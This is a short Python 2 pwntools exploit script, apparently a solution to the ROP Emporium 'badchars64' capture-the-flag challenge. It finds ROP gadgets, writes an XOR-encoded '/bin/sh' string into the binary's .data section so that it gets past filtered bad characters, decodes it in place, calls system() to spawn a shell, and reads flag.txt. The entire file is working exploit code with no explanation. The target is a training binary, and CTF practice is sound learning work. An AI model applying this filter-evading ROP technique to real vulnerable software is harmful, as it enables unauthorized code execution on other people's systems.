#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *


def get_section_addr(b, name):
    return b.get_section_by_name(name).header.sh_addr


def sxor(s1, s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))


def main():
    context(arch="amd64", os="linux", endian="little")
    e = ELF("./badchars64")
    rop = ROP([e])

    pop_r12_r13 = rop.find_gadget(["pop r12", "pop r13", "ret"])[0]
    pop_r14_r15 = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    xor = 0x0000000000400b30                                        # xor [r15], r14b
    mov = 0x0000000000400b34                                        # mov [r13+0x0], r12
    data = get_section_addr(e, '.data') + 8
    system = e.plt['system']
    key_xor = "Z" * 8
    string = sxor("/bin/sh"+"\x00", key_xor)

    rop.raw(rop.generatePadding(0,40))
    rop.raw(p64(pop_r12_r13) + string + p64(data) + p64(mov))
    for i, _ in enumerate(string):
        rop.raw(p64(pop_r14_r15) + key_xor + p64(data+i) + p64(xor))
    rop.raw(p64(pop_rdi) + p64(data) + p64(system))

    p = process(['./badchars64'])
    msg = p.recv(timeout=0.1)
    print msg

    p.sendline(str(rop))
    p.sendline("/bin/cat flag.txt")
    msg = p.recvline(timeout=1)
    print msg

    p.close()


if __name__ == "__main__":
    main()
